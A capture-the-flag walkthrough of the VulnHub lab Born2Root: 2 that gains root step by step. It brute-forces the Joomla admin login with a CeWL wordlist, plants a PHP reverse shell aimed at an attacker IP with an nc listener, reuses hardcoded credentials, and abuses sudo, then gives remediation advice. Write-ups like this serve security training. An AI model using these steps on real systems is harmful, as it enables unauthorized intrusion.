# VulnHub Born2Root: 2 — Joomla Brute-Force to Root via Sudo

Look at this guys!! Who would have thought a Joomla blog about travel would become the gateway to full root compromise? Born2Root: 2 chains a CeWL custom wordlist attack on the Joomla admin panel, template-based PHP reverse shell, hardcoded credentials in a local Python script, and an over-permissive sudo rule that makes root trivial. Legit a perfect combo of "developer mistakes" bundled into one machine.

Big thanks to the author for making this machine feel like a realistic internal web app assessment, with mistakes that real developers make every day.

---

| Field | Value |
|-------|-------|
| **Level** | Easy / Beginner |
| **Target VM** | Born2Root: 2 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub** | https://www.vulnhub.com/entry/born2root-2,421/ |
| **Techniques** | Directory brute-force, CeWL wordlist, Joomla admin brute-force, PHP reverse shell via template editor, hardcoded credentials, sudo privilege escalation |
| **CVEs / CWEs** | CWE-521 (Weak Password Requirements), CWE-522 (Insufficiently Protected Credentials), CWE-269 (Improper Privilege Management via sudo), CWE-798 (Hardcoded Credentials) |
| **APT Groups** | FIN7 (web application credential brute-force), APT33 (web shell via CMS template manipulation), Kimsuky (hardcoded credential harvesting in post-exploitation) |

---

## Attack Summary

```
[host-discovery: nmap]
    |
    v
[nmap: 22/tcp SSH | 80/tcp HTTP | 111/tcp RPC]
    |
    v
[dirb => /joomla/ discovered => "Tim's Blog"]
    |
    v
[CeWL from /joomla/ => custom wordlist including "travel"]
    |
    v
[Burp Intruder brute-force: admin:travel => Joomla admin access]
    |
    v
[Joomla template editor: beez3/index.php => PHP reverse shell]
    |
    v
[nc listener => shell as www-data]
    |
    v
[/opt/scripts/fileshare.py => tim:lulzlol (hardcoded)]
    |
    v
[su tim => sudo -l => sudo su => ROOT]
    |
    v
[/root/flag.txt]
```

---

## Methodology

1. Network enumeration with Nmap
2. Directory brute-force with dirb to discover Joomla installation
3. CeWL wordlist generation from the Joomla site content
4. Joomla admin panel brute-force with Burp Suite Intruder
5. PHP reverse shell injection via Joomla template editor
6. Post-exploitation: search for hardcoded credentials in local scripts
7. Lateral movement to `tim` using harvested credentials
8. Privilege escalation via over-permissive sudo rule

---

## Step 1 — Identifying the Target

```bash
netdiscover -r 192.168.1.0/24
```

Target: **192.168.1.9**

```bash
nmap -A -T4 192.168.1.9
```

Expected output:

```
22/tcp  open  ssh    OpenSSH
80/tcp  open  http   Apache/2.x
111/tcp open  rpcbind
```

Three services: SSH, HTTP, and RPC. Standard Linux web server footprint.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1046 Network Service Discovery

---

## Step 2 — Web Enumeration and CMS Discovery

The main page looks generic. Directory brute-force is needed to find the CMS:

```bash
dirb http://192.168.1.9/
```

Expected output reveals `/joomla/`. Browse to `http://192.168.1.9/joomla/` and it is "Tim's Blog" running Joomla CMS. That username hint is subtle but useful.

The Joomla admin panel lives at: `http://192.168.1.9/joomla/administrator/`

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1083 File and Directory Discovery

---

## Step 3 — Custom Wordlist with CeWL

> **What is CeWL?** CeWL (Custom Word List generator) spiders a website and generates a wordlist from the words found on the page. It is highly effective against targets where passwords are likely derived from site content, product names, or themes. In this case, "Tim's Blog" is about travel, and the admin password is literally a word from the blog content.

```bash
cewl http://192.168.1.9/joomla/ > dict.txt
cat dict.txt | wc -l    # Check wordlist size
head -20 dict.txt       # Preview entries
```

This generates a context-specific wordlist. Look for words like "travel", "journey", "adventure" in the output.

> **Real-world note:** Site-specific wordlists dramatically improve success rates against web application authentication. Security teams routinely find that users choose passwords related to their role, company name, or the application's theme. This technique is used by APT33 and FIN7 in targeted credential attacks.

> **MITRE ATT&CK:** TA0006 Credential Access | T1110.002 Password Spraying

---

## Step 4 — Joomla Admin Brute-Force with Burp Suite

Set up Burp Suite Intruder on the Joomla admin login at `http://192.168.1.9/joomla/administrator/`:

1. Intercept a login attempt with Burp Proxy.
2. Send the request to Intruder.
3. Mark the `passwd` field as the payload position.
4. Load `dict.txt` as the Simple list payload.
5. Start the attack and watch response lengths.

When Intruder hits the right password, the response length will differ from the failed attempts.

**Credentials found:** `admin` / `travel`

> **MITRE ATT&CK:** TA0006 Credential Access | T1110.001 Password Guessing | T1078 Valid Accounts

---

## Step 5 — PHP Reverse Shell via Joomla Template Editor

Log in to the Joomla admin panel as `admin:travel`.

Navigate to: **Extensions > Templates > Templates > beez3 > index.php**

Replace the entire contents of `index.php` with a PHP reverse shell. Edit `/usr/share/webshells/php/php-reverse-shell.php` first:

```php
$ip = '<YOUR_ATTACKER_IP>';
$port = 1234;
```

Paste the full shell content into the Joomla template editor and click **Save**.

Start the netcat listener:

```bash
nc -lvnp 1234
```

Trigger the shell by browsing to:

```
http://192.168.1.9/joomla/templates/beez3/index.php
```

Shell received as `www-data`. Stabilize:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

> **What is template-based RCE in Joomla?** The Joomla template editor allows authenticated administrators to directly modify PHP template files. Since templates are executed on every page request, replacing a template file with a reverse shell payload achieves immediate RCE. This is not a CVE but a design feature that becomes critical when combined with weak admin credentials. It maps to CWE-94 (Improper Control of Code Generation).

> **MITRE ATT&CK:** TA0002 Execution | T1505.003 Server Software Component: Web Shell

---

## Step 6 — Post-Exploitation: Credential Discovery

Enumerate local scripts and configuration files:

```bash
ls /opt/
ls /opt/scripts/
cat /opt/scripts/fileshare.py
```

`fileshare.py` contains hardcoded credentials:

```python
# ... somewhere in the script
user = "tim"
password = "lulzlol"
```

That is a critical finding: plaintext credentials for a local user stored in a Python script that any user on the system can read. Bruh fr fr.

> **MITRE ATT&CK:** TA0006 Credential Access | T1552.001 Credentials in Files

---

## Step 7 — Lateral Movement to tim

```bash
su tim
# Password: lulzlol

id
# uid=1001(tim) gid=1001(tim) groups=1001(tim)
```

You are now `tim`. This is a lateral move from the web service account to a real user account.

> **MITRE ATT&CK:** TA0008 Lateral Movement | T1078 Valid Accounts

---

## Step 8 — Privilege Escalation via Sudo

Check what `tim` can run with sudo:

```bash
sudo -l
```

Expected output reveals broad sudo permissions. Escalate:

```bash
sudo su
```

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
ls
cat flag.txt
```

**(ﾉ◕ヮ◕)ﾉ Got root!! Nailed it with the most classic sudo privesc of all time!!**

> **MITRE ATT&CK:** TA0004 Privilege Escalation | T1548.003 Sudo and Sudo Caching

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| Joomla Admin | `admin:travel` | /joomla/administrator/ (brute-force) | Joomla admin login |
| Local user creds | `tim:lulzlol` | /opt/scripts/fileshare.py | su tim |
| Root Flag | see `/root/flag.txt` | `/root/flag.txt` | N/A |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | Joomla admin password derived from site content ("travel") | Site-specific passwords are systematically targeted by CeWL-based attacks | Enforce password complexity that cannot be derived from company/app context |
| 2 | Joomla template editor allowed direct PHP file modification | Admin access to CMS template editors is equivalent to server code execution | Disable web-based template editing in production; use filesystem deployment |
| 3 | Hardcoded credentials in `/opt/scripts/fileshare.py` | Hardcoded secrets in scripts are a top finding in cloud and container security assessments | Use environment variables or a secrets manager (HashiCorp Vault, AWS Secrets Manager) |
| 4 | Over-permissive sudo rule gave `tim` a trivial path to root | Misconfigured sudoers is one of the most common Linux privesc vectors | Follow principle of least privilege; run `sudo -l` on all service accounts as part of hardening audits |

**Why does this matter outside the lab?**

The combination of CMS brute-force plus template RCE is a real attack pattern. Multiple Joomla and WordPress incidents have followed this exact chain: weak admin password discovered through credential stuffing or site-specific wordlist, then RCE via theme/plugin editor. APT33 and FIN7 both documented using CMS administrative access to plant web shells in enterprise environments. The hardcoded credentials finding maps directly to the recurring problem of secrets in code repositories, where tools like TruffleHog, GitLeaks, and Semgrep regularly find production database passwords and API keys committed to git history.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | File and Directory Discovery | T1083 |
| Initial Access | TA0001 | Valid Accounts: Local Accounts | T1078.003 |
| Credential Access | TA0006 | Brute Force: Password Guessing | T1110.001 |
| Credential Access | TA0006 | Credentials in Files | T1552.001 |
| Execution | TA0002 | Server Software Component: Web Shell | T1505.003 |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | TA0003 | Server Software Component: Web Shell | T1505.003 |
| Privilege Escalation | TA0004 | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Lateral Movement | TA0008 | Valid Accounts | T1078 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Enforce strong password policy for all CMS admin accounts; minimum 16 characters, complexity required, no dictionary words.
2. Enable multi-factor authentication on the Joomla admin panel.
3. Disable the Joomla template editor in production (`php_flag display_errors Off` is not enough; restrict the editor via ACL configuration).
4. Migrate all hardcoded credentials in scripts to environment variables or a secrets manager.
5. Audit `/etc/sudoers` and remove any rules granting users broad sudo access; use the NOPASSWD directive only for specific, scoped commands.
6. Place the Joomla admin panel behind IP restriction or VPN access.

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Rotate the Joomla admin password immediately; review all admin accounts.
- Scan all scripts and configuration files for hardcoded credentials with: `grep -rE "(password|passwd|secret|token)\s*=\s*['\"]" /opt/ /home/ /var/www/`
- Audit `/etc/sudoers` with `sudo -l` for all non-root users.
- Remove any planted web shells: `find /var/www -name "*.php" -newer /var/www/html/index.php`

**MITRE D3FEND countermeasures:**
- D3-PH Password Hardening for Joomla admin accounts (T1110.001)
- D3-UAP User Account Permissions review for sudo rules (T1548.003)
- D3-FAPA File Access Pattern Analysis to detect credential files readable by web service accounts (T1552.001)
- D3-NTF Network Traffic Filtering to restrict Joomla admin access by IP (T1078)

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Inventory all CMS installations and associated admin accounts.
- Protect (PR.AC-4): Privileged access management; restrict CMS admin to authorized personnel with MFA.
- Protect (PR.DS-2): Protect data in transit; ensure admin panel uses HTTPS.
- Detect (DE.CM-7): Monitor for unauthorized login attempts on CMS admin panels.
- Respond (RS.RP-1): Execute IR plan on detection of unauthorized CMS admin login.
- Recover (RC.RP-1): Restore CMS from clean backup after web shell detection.

**NIST SP 800-53 Rev. 5 Controls:**
- IA-5: Authenticator Management (enforce password complexity, MFA for admin accounts)
- AC-6: Least Privilege (restrict sudo rules to specific commands)
- CM-7: Least Functionality (disable template editor in production CMS)
- SI-12: Information Management and Retention (do not store credentials in scripts)
- SA-15: Development Process, Standards, and Tools (secrets management in CI/CD)

**CISA Known Exploited Vulnerabilities:**
- No direct CVE for this specific attack chain; Joomla RCE vulnerabilities such as CVE-2015-8562 and CVE-2023-23752 are in the CISA KEV catalog and represent the same attack surface.
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: ACCESS (Identity and Access Management)
- Practice: Manage Access
- Target MIL: MIL-2 (access control policies documented and enforced, MFA for privileged access)

---

## Final Thoughts

Thanks to the author of Born2Root: 2 for building a machine that captures exactly the types of mistakes real developers make: a password tied to the app's theme, editing production files through a web interface, secrets in scripts, and too much sudo. Each finding individually seems small, but together they hand over the box in under 30 minutes.

The CeWL technique is particularly worth internalizing: custom wordlists built from target context are consistently more effective than rockyou.txt against single targets. Any red team engagement against a company should start with a CeWL pass over their public-facing sites.

If this walkthrough helped you, share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup by [André Henrike](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
